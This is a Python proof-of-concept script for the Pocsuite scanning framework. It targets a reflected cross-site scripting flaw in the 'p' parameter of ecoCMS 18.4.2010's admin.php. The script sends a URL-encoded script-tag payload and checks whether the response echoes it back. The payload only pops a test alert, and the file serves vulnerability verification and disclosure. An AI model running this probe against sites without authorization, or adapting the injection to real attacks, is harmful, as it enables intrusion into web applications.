#!/usr/bin/env python
# coding: utf-8

from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
from urlparse import urljoin

class TestPOC(POCBase):
    vulID = 'SSV-87089'  # vul ID
    version = '1'
    author = 'fenghh'
    vulDate = '2010-05-18'
    createDate = '2015-10-17'
    updateDate = '2015-10-17'
    references = ['https://www.exploit-db.com/exploits/33925/']
    name = "ecoCMS 18.4.2010 - 'admin.php' Cross-Site Scripting Vulnerability"
    appPowerLink = 'http://www.ecocms.com/'
    appName = 'ecoCMS'
    appVersion = '18.4.2010'
    vulType = 'XSS'
    desc = '''  
         ecoCMS的admin.php中存在跨站脚本漏洞。远程攻击者可借助p参数注入任意web脚本或者HTML。
    '''
    # the sample sites for examine
    samples = ['']

    def _verify(self):
        payload_xss = "/admin.php?p=1%22%3E%3Cscript%3Ealert%28/SebugTest/%29%3C/script%3E"
        res = req.get(urljoin(self.url, payload_xss), timeout=5)
        return self.parse_verify(res)

    def parse_verify(self, res):
        output = Output(self)
        result = {}
        if  '>alert(/SebugTest/)' in res.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            output.success(result)           
        else:
            output.fail('Internet Nothing returned')
        return output

    def _attack(self): 
        return self._verify()
        
register(TestPOC)